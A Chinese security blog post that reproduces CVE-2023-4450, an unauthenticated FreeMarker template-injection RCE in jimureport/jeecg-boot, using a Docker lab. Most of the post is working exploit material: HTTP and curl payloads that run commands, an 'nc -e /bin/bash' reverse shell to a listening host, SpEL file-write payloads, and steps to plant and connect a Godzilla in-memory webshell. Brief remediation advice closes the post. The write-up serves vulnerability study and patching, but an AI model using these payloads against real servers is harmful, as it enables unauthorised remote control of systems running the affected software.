---
title: Freemarker 模板注入到内存马
date: "2023-08-23 23:59:00"
index_img: https://cdn.jsdelivr.net/gh/ReaJason/blog_imgs/FirstTechnicalInterview_index_img.png
tags: [Notes]
categories: [Summary]
description: "CVE-2023-4450"
---
> 当前文章所提供脚本，仅供学习使用，请勿使用到生产环境

## TLDR
在已知 [jeecg-boot](https://github.com/jeecgboot/jeecg-boot) 企业级开源项目存在 ssti 漏洞但不知道具体位置的情况下，通过搜索注入特征点找到了未授权即可访问的 web api 点，并通过自动生成内存马工具进行注入，实现对目标机器的控制，该漏洞属于 RCE 高危漏洞。

## 漏洞影响范围
> https://nvd.nist.gov/vuln/detail/CVE-2023-4450
- 集成了 [jimureport <= 1.6.0](http://jimureport.com/) 的系统，例  [jeecg-boot v3.5.3](https://github.com/jeecgboot/jeecg-boot/releases/tag/v3.5.3)

## 漏洞复现环境
> 需要 Docker 环境，使用 docker-compose.yaml 启动漏洞复现环境
```yaml
version: '2'
services:
  jeecg-boot-mysql:
    image: reajason/jeecg-boot-mysql:3.5.3
    environment:
      MYSQL_ROOT_PASSWORD: root
      MYSQL_ROOT_HOST: '%'
      TZ: Asia/Shanghai
    restart: always
    container_name: jeecg-boot-mysql
    command:
      --character-set-server=utf8mb4
      --collation-server=utf8mb4_general_ci
      --explicit_defaults_for_timestamp=true
      --lower_case_table_names=1
      --max_allowed_packet=128M
      --default-authentication-plugin=caching_sha2_password

  jeecg-boot-redis:
    image: redis:5.0
    restart: always
    hostname: jeecg-boot-redis

  jeecg-boot-system:
    image: reajason/jeecg-boot-system:3.5.3
    restart: on-failure
    depends_on:
      - jeecg-boot-mysql
      - jeecg-boot-redis
    hostname: jeecg-boot-system
    ports:
      - 8080:8080
```

启动 docker 环境：`docker-compose up -d` 或 `docker compose up -d`

后端接口访问地址：http://localhost:8080/jeecg-boot

积木报表地址：http://localhost:8080/jeecg-boot/jmreport/list

## 漏洞触发
未授权漏洞点：http://localhost:8080/jeecg-boot/jmreport/queryFieldBySql

### RCE

#### 1. 执行 id 命令

**payload:** `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}`

HTTP 请求体
```http
POST /jeecg-boot/jmreport/queryFieldBySql HTTP/1.1
Host: localhost:8080
Content-Type: application/json

{
    "sql": "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
    "type": "0"
}

```
curl 命令
```bash
curl --location 'http://localhost:8080/jeecg-boot/jmreport/queryFieldBySql' \
--header 'Content-Type: application/json' \
--data '{
    "sql": "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
    "type": "0"
}'
```

可查看容器日志查看执行结果（debug 日志，为方便测试漏洞环境开启了 debug 日志）：
```bash
2023-08-23 22:05:09.739 [http-nio-8080-exec-1] DEBUG o.j.m.j.common.interceptor.JimuReportInterceptor:48 - JimuReportInterceptor check requestPath = /jmreport/queryFieldBySql
2023-08-23T14:05:09.765672857Z 2023-08-23 22:05:09.760 [http-nio-8080-exec-1] DEBUG o.j.m.j.common.interceptor.JimuReportInterceptor:56 - customPrePath: null
2023-08-23T14:05:09.785445737Z 2023-08-23 22:05:09.783 [http-nio-8080-exec-1] DEBUG org.jeecg.modules.jmreport.desreport.a.a:766 - ============解析sql==========
2023-08-23T14:05:09.804763148Z 2023-08-23 22:05:09.803 [http-nio-8080-exec-1] DEBUG o.j.m.j.desreport.render.utils.FreeMarkerUtils:102 - 模板内容:<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
2023-08-23T14:05:09.911876597Z 2023-08-23 22:05:09.907 [http-nio-8080-exec-1] DEBUG o.j.m.j.desreport.render.utils.FreeMarkerUtils:104 - 模板解析结果:uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
```

#### 2. 反弹 shell

本机开启端口监听：`nc -lvvp 2333`

查看本机 IP：`192.168.1.5`

**payload:** `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("nc 192.168.1.5 2333 -e /bin/bash")}`

HTTP 请求体
```http
POST /jeecg-boot/jmreport/queryFieldBySql HTTP/1.1
Host: localhost:8080
Content-Type: application/json

{
    "sql": "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"nc 192.168.1.5 2333 -e /bin/bash\")}",
    "type": "0"
}
```
curl 命令
```bash
curl --location 'http://localhost:8080/jeecg-boot/jmreport/queryFieldBySql' \
--header 'Content-Type: application/json' \
--data '{
    "sql": "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"nc 192.168.1.5 2333 -e /bin/bash\")}",
    "type": "0"
}'
```

![反弹 shell](https://cdn.jsdelivr.net/gh/ReaJason/blog_imgs/FreemarkerSSTIMemShell_img/shell.png)

### SPEL

#### 1. 写文件

**payload1:** `${"freemarker.template.utility.ObjectConstructor"?new()("org.springframework.expression.spel.standard.SpelExpressionParser").parseExpression("T(org.apache.commons.io.FileUtils).writeStringToFile(new java.io.File('/tmp/hello.txt'), 'hello freemarker ssti~\n')").getValue()}`

**payload2:** `<#assign ex=\"freemarker.template.utility.ObjectConstructor\"?new()>${ex(\"org.springframework.expression.spel.standard.SpelExpressionParser\").parseExpression(\"T(org.apache.commons.io.FileUtils).writeStringToFile(new java.io.File('/tmp/hello.txt'), 'hello freemarker ssti~\n')\").getValue()}`

HTTP 请求体
```http
POST /jeecg-boot/jmreport/queryFieldBySql HTTP/1.1
Host: localhost:8080
Content-Type: application/json

{
    "sql": "${\"freemarker.template.utility.ObjectConstructor\"?new()(\"org.springframework.expression.spel.standard.SpelExpressionParser\").parseExpression(\"T(org.apache.commons.io.FileUtils).writeStringToFile(new java.io.File('/tmp/hello.txt'), 'hello freemarker ssti~\n')\").getValue()}",
    "type": "0"
}
```

curl 命令
```bash
curl --location 'http://localhost:8088/jeecg-boot/jmreport/queryFieldBySql' \
--header 'Content-Type: application/json' \
--data '{
    "sql": "${\"freemarker.template.utility.ObjectConstructor\"?new()(\"org.springframework.expression.spel.standard.SpelExpressionParser\").parseExpression(\"T(org.apache.commons.io.FileUtils).writeStringToFile(new java.io.File('\''/tmp/hello.txt'\''), '\''hello freemarker ssti~\n'\'')\").getValue()}",
    "type": "0"
}'
```

### 一键哥斯拉内存马
> 一键生成内存马工具：https://github.com/pen4uin/java-memshell-generator

> 哥斯拉工具：https://github.com/BeichenDream/Godzilla

由于当前接口代码逻辑放置了大量正则进行 SQL 注入检测，故直接使用 freemarker 进行内存马注入会卡在正则过滤上，在老大的帮助下，使用了先写入内存马 jar 文件后再加载内存马类的方式来实现内存马注入。

1. 注入内存马

下载 [脚本](https://gist.github.com/ReaJason/68fce1f02b0f6f51b8d0984e4266c3ff) 将其命名为 `jeecg-boot-godzilla.py`，编辑脚本将 `back_url` 设置成漏洞复现后端地址例如：`http://localhost:8080/jeecg-boot`，执行 `python jeecg-boot-godzilla.py` 运行脚本等待内存马注入完成（执行显示解析失败是正常现象）。

2. 连接内存马

下载 [godzilla](https://github.com/BeichenDream/Godzilla/releases/tag/v4.0.1-godzilla)，使用 `java -jar godzilla.jar` 启动 `godzilla`，点击目标添加，输入如下参数。

- URL：`http://192.168.1.5:8080/jeecg-boot/`，地址请使用 Docker 所在主机 IP，例 `192.168.1.5`
- 密码：`pass`
- 密钥：`key`
- User-Agent: `Kndux`，将其添加到请求配置其中即可

![基础配置](https://cdn.jsdelivr.net/gh/ReaJason/blog_imgs/FreemarkerSSTIMemShell_img/godzillaConfig.png)

![请求配置](https://cdn.jsdelivr.net/gh/ReaJason/blog_imgs/FreemarkerSSTIMemShell_img/user-agent.png)

![进入成功](https://cdn.jsdelivr.net/gh/ReaJason/blog_imgs/FreemarkerSSTIMemShell_img/success.png)

## 漏洞修复建议
1. 将 `jimureport-spring-boot-starter` 第三方依赖升级至 1.6.1 以上版本
2. 将 `/jmreport/queryFieldBySql` 接口进行登录认证。
3. 使用 [靖云甲 RASP](https://www.boundaryx.com/category/product/adr) 时刻保护应用安全，有效防护开源第三方库潜在的 0day 漏洞。

## 延伸阅读
- [jeecg-boot / 积木报表基于 SSTI 的任意代码执行漏洞](https://www.oschina.net/news/254100)
- [Server Side Template Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
- [Memoryshell-JavaALL](https://github.com/achuna33/Memoryshell-JavaALL)
- [Godzilla](https://github.com/BeichenDream/Godzilla)
- [java-memshell-generator](https://github.com/pen4uin/java-memshell-generator)
